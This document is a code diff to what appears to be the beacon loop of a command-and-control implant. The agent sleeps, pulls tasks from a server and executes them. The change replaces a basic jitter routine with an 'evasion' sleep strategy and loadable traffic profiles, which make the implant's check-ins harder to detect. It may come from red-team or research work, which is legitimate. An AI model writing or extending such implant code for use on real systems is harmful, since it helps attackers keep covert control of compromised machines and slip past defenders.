@@ -9,9 +9,10 @@ from common import message_format as mf
 from common.crypto import get_session_key
 from common.logger import get_logger, update_session
 from common.utils import TransportError
-from agent import jitter
 from agent.executor import execute
 from transport.http_transport import send_beacon
+from evasion.sleep_strat import get_sleep_fn
+from transport.traffic_profile import load_active_profile
 
 logger = get_logger('agent')
 
@@ -47,7 +48,9 @@ class BeaconLoop:
     def __init__(self):
         self._session_id  = None
         self._key         = get_session_key()
-        self._backoff_idx = 0  # index into BACKOFF_SEQUENCE
+        self._backoff_idx = 0
+        self._profile     = load_active_profile()  # load once at startup
+        self._sleep_fn    = get_sleep_fn(self._profile.jitter_strategy)
 
     def _backoff_sleep(self) -> None:
         # Sleep for the current back-off duration then advance the index.
@@ -142,17 +145,18 @@ class BeaconLoop:
         while True:
             try:
                 # Step 2a — compute jittered sleep interval
-                sleep_s = jitter.compute_sleep(
+                sleep_s = self._sleep_fn(
                     config.BEACON_INTERVAL_S,
-                    config.JITTER_PCT,
+                    self._profile.jitter_pct,
                 )
 
                 # Step 2b — sleep then send TASK_PULL
                 logger.info('sleeping before beacon', extra={
-                    'sleep_s':    round(sleep_s, 2),
-                    'base_s':     config.BEACON_INTERVAL_S,
-                    'jitter_pct': config.JITTER_PCT,
-                    'session_id': self._session_id,
+                    'sleep_s':          round(sleep_s, 2),
+                    'base_s':           config.BEACON_INTERVAL_S,
+                    'jitter_pct':       self._profile.jitter_pct,
+                    'jitter_strategy':  self._profile.jitter_strategy,
+                    'session_id':       self._session_id,
                 })
                 time.sleep(sleep_s)
 
